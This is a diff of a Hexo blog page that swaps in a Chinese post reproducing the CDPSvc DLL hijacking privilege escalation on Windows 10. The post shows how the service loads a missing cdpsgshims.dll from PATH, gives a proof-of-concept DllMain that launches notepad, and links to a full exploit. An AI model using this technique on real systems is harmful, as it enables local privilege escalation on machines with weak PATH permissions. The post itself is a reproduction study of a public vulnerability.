@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>单程博客</title>
+  <title>CDPSvc提权-复现 | 单程博客</title>
   <meta name="keywords" content="">
-  <meta name="description" content="单程博客">
+  <meta name="description" content="CDPSvc提权-复现 | 单程博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="前言这是对cdpsvc这个服务的一个dll劫持的漏洞复现。主要原理是cdpsvc服务在启动时会通过调用来加载缺少的cdpsgshims.dll。按照Windows的DLL搜索顺序，它将首先尝试从“系统”文件夹中加载它，然后遍历存储在PATH环境变量中的目录列表，因此，如果这些文件夹之一配置了弱权限，则可以植入DLL的“恶意”版本，从而能够以NT AUTHORITY\LOCAL SERVICE在重新">
 <meta property="og:type" content="article">
@@ -59,7 +59,7 @@
 </div>
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/img/avatar.jpg" />
@@ -172,12 +172,43 @@
         </div>
     </div>
 </aside>
-<div class="post index">
+<div class="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-CDPSvc-DLL劫持-复现" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Why-Blog"><span class="toc-text">Why Blog</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#对博客的理解"><span class="toc-text">对博客的理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于叶落阁"><span class="toc-text">关于叶落阁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#博客平台"><span class="toc-text">博客平台</span></a></li></ol></li></ol>
+        <h1 class="article-title">CDPSvc提权-复现</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-12-18 10:44:38'>2019-12-17 19:46</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -190,32 +221,59 @@
     }
 </style>
 </div>
-            <h1 id="Why-Blog"><a href="#Why-Blog" class="headerlink" title="Why Blog"></a>Why Blog</h1><h2 id="对博客的理解"><a href="#对博客的理解" class="headerlink" title="对博客的理解"></a>对博客的理解</h2><p>喜欢写Blog的人，会经历三个阶段。</p>
-<blockquote>
-<p>第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。</p>
-</blockquote>
-<blockquote>
-<p>第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。</p>
-</blockquote>
-<blockquote>
-<p>第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。</p>
-</blockquote>
-<p>我们每个人的在网络上产生的数据越来越多，这些信息是我们在互联网上存在过的痕迹，值得我们认真对待。但是它们被分散分布在各个网站上。很多时候我们很难将它们聚合在一起，而且各个网站的信息排布方式也没有办法自由控制，所以我们需要一个可以由自己主宰的空间——博客。</p>
-<p>通过博客，我们可以记录自己的生活和成长的轨迹。它不像 Twitter 那样碎片化，也不像 Facebook 那样关系化，它是私人的空间。</p>
-<h2 id="关于叶落阁"><a href="#关于叶落阁" class="headerlink" title="关于叶落阁"></a>关于叶落阁</h2><p><strong>叶落阁</strong> 是阿杰（杨玉杰）的个人站。</p>
-<p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
-<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次</p>
-<h2 id="博客平台"><a href="#博客平台" class="headerlink" title="博客平台"></a>博客平台</h2><p>这个博客通过 <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> 生成，部署在 <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a>，主题 <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank" rel="noopener">3-hexo</a> 已经在github上开源</p>
-<p>主要功能：</p>
-<ul>
-<li>搜索支持文章标题、标签(#标签)、作者(@作者)</li>
-<li>pad/手机等移动端适配</li>
-<li>页面全局快捷键 <a href='http://yelog.org/2017/03/24/3-hexo-shortcuts/' target="_blank" rel="noopener">3-hexo快捷键说明</a></li>
-</ul>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是对cdpsvc这个服务的一个dll劫持的漏洞复现。主要原理是cdpsvc服务在启动时会通过调用来加载缺少的cdpsgshims.dll。按照Windows的DLL搜索顺序，它将首先尝试从“系统”文件夹中加载它，然后遍历存储在PATH环境变量中的目录列表，因此，如果这些文件夹之一配置了弱权限，则可以植入DLL的“恶意”版本，从而能够以<code>NT AUTHORITY\LOCAL SERVICE</code>在重新启动时执行任意代码。</p>
+<p>来自：<a href="https://itm4n.github.io/cdpsvc-dll-hijacking" target="_blank" rel="noopener">https://itm4n.github.io/cdpsvc-dll-hijacking</a></p>
+<p>这个服务在widnows 10 17601之后就默认自启动</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>通过process hacker可查看cdpsvc服务的位置，C:\Windows\System32\cdpsvc.dll</p>
+<p><img src="image-20191217210631314.png" alt=""></p>
+<p>通过ida反汇编dll，可看到cdpsvc.dll加载了cdpsgshims.dll</p>
+<p><img src="image-20191217213358053.png" alt=""></p>
+<p><img src="image-20191217213251248.png" alt=""></p>
+<p>我们用重启cdpsvc服务，同时用process monitor查看cdpsvc服务启动过程，可看到这样的场景，服务从环境变量路径中查找了cdpsgshims.dll文件。</p>
+<p><img src="image-20191217213754267.png" alt=""></p>
+<p>我们编写一个dll验证一下，在dll入口处添加一个打开程序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">				WinExec(&quot;notepad&quot;, 5);</span><br><span class="line">				break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) int InternetQueryOptionA()&#123;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-        </article>
-        
-        
+<p>将调试器改为Release和x86/x64，进行编译，同时新建一个文件夹test，添加到PATH中，将编译后的文件重命名为cdpsgshims.dll后放入test文件夹，重启cdpsvc服务。</p>
+<p><img src="image-20191217214435889.png" alt=""></p>
+<p>看到确实加载了dll，而且查看到notepad程序</p>
+<p><img src="image-20191217214543625.png" alt=""></p>
+<p>到此算是证明成功。</p>
+<hr>
+<p>有大佬写了dll的劫持，连接如下：</p>
+<p><a href="https://github.com/itm4n/CDPSvcDllHijacking" target="_blank" rel="noopener">https://github.com/itm4n/CDPSvcDllHijacking</a></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 heiseqiubite@qq.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>CDPSvc提权-复现</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="单程">单程</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-12-17, 19:46:06</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-18, 10:44:38</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/17/CDPSvc-DLL%E5%8A%AB%E6%8C%81-%E5%A4%8D%E7%8E%B0/" title="CDPSvc提权-复现">http://yoursite.com/2019/12/17/CDPSvc-DLL%E5%8A%AB%E6%8C%81-%E5%A4%8D%E7%8E%B0/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">©2016-2019 Yelog</p>
